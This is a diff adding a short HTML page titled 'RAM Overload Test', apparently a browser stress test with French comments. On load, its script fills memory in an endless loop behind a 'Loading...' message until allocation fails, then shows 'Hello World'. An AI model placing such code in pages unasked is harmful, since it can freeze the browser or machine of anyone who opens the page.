@@ -1,0 +1,27 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>RAM Overload Test</title>
+    <style>
+        body { background-color: black; color: white; font-size: 2em; text-align: center; padding-top: 20%; }
+    </style>
+</head>
+<body>
+    <div id="message">Loading...</div>
+    <script>
+        function overloadRAM() {
+            let arr = [];
+            try {
+                while (true) {
+                    arr.push(new Array(1000000).fill("A")); // Remplit la mémoire
+                }
+            } catch (e) {
+                document.getElementById("message").innerText = "Hello World";
+            }
+        }
+        setTimeout(overloadRAM, 1000); // Démarre après 1s
+    </script>
+</body>
+</html>
